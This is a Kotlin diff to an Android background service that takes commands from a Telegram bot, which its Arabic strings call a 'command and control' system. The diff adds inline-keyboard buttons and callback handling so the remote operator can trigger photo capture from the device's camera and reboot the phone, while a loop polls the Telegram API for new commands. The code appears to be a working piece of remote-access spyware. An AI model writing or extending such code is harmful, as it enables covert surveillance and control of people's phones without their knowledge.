@@ -85,19 +85,28 @@ class BackgroundControlService : Service() {
                                 val update = results.getJSONObject(i)
                                 lastUpdateId = update.getLong("update_id")
 
+                                // دعم الأوامر النصية وضغطات الأزرار (callback_query)
+                                var chatId = ""
+                                var text = ""
+
                                 if (update.has("message")) {
                                     val message = update.getJSONObject("message")
                                     if (message.has("text")) {
-                                        val chatId = message.getJSONObject("chat").getLong("id").toString()
-                                        val text = message.getString("text")
+                                        chatId = message.getJSONObject("chat").getLong("id").toString()
+                                        text = message.getString("text")
                                         handleCommand(chatId, text)
                                     }
+                                } else if (update.has("callback_query")) {
+                                    val callbackQuery = update.getJSONObject("callback_query")
+                                    chatId = callbackQuery.getJSONObject("message").getJSONObject("chat").getLong("id").toString()
+                                    text = callbackQuery.getString("data")
+                                    handleCommand(chatId, text)
                                 }
                             }
                         }
                     }
                 } catch (e: Exception) {
-                    // تجاهل أخطاء الشبكة المؤقتة وإعادة المحاولة
+                    // تجاهل أخطاء الشبكة المؤقتة
                 }
                 Thread.sleep(7000)
             }
@@ -106,8 +115,9 @@ class BackgroundControlService : Service() {
 
     private fun handleCommand(chatId: String, text: String) {
         when {
-            text == "/start" -> {
-                sendTelegramMessage(chatId, "🫡 أهلاً بك يا فندم! نظام السيطرة والتحكم متصل وجاهز ميدانياً.\n\nالأوامر المتاحة:\n📸 /photo - التقاط صورة طبيعية\n🔌 /reboot - إعادة تشغيل الجهاز")
+            text == "/start" || text == "لوحة التحكم" -> {
+                val welcomeMsg = "🫡 أهلاً بك يا فندم في غرفة عمليات التحكم الميداني.\nاختر الأمر المطلوب من الأزرار أدناه:"
+                sendTelegramMessageWithKeyboard(chatId, welcomeMsg)
             }
             text == "/photo" || text.contains("صورة") -> {
                 try {
@@ -116,7 +126,7 @@ class BackgroundControlService : Service() {
                         putExtra("chat_id", chatId)
                     }
                     applicationContext.startActivity(intent)
-                    sendTelegramMessage(chatId, "📸 جاري تشغيل الكاميرا والتقاط الصورة الآن...")
+                    sendTelegramMessage(chatId, "📸 جاري تشغيل الكاميرا والتقاط الصورة الطبيعية الآن...")
                 } catch (e: Exception) {
                     sendTelegramMessage(chatId, "⚠️ فشل تشغيل واجهة الكاميرا: ${e.message}")
                 }
@@ -142,6 +152,43 @@ class BackgroundControlService : Service() {
                 val urlString = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=${java.net.URLEncoder.encode(text, "UTF-8")}"
                 val connection = URL(urlString).openConnection() as HttpURLConnection
                 connection.requestMethod = "GET"
+                connection.inputStream.close()
+            } catch (e: Exception) {}
+        }
+    }
+
+    private fun sendTelegramMessageWithKeyboard(chatId: String, text: String) {
+        thread {
+            try {
+                val keyboardJson = """
+                    {
+                      "inline_keyboard": [
+                        [
+                          {"text": "📸 التقاط صورة", "callback_data": "/photo"},
+                          {"text": "🔌 إعادة تشغيل", "callback_data": "/reboot"}
+                        ]
+                      ]
+                    }
+                """.trimIndent()
+
+                val urlString = "https://api.telegram.org/bot$botToken/sendMessage"
+                val url = URL(urlString)
+                val connection = url.openConnection() as HttpURLConnection
+                connection.requestMethod = "POST"
+                connection.doOutput = true
+                connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
+
+                val payload = JSONObject().apply {
+                    put("chat_id", chatId)
+                    put("text", text)
+                    put("reply_markup", JSONObject(keyboardJson))
+                }
+
+                val os = connection.outputStream
+                os.write(payload.toString().toByteArray(Charsets.UTF_8))
+                os.flush()
+                os.close()
+
                 connection.inputStream.close()
             } catch (e: Exception) {}
         }
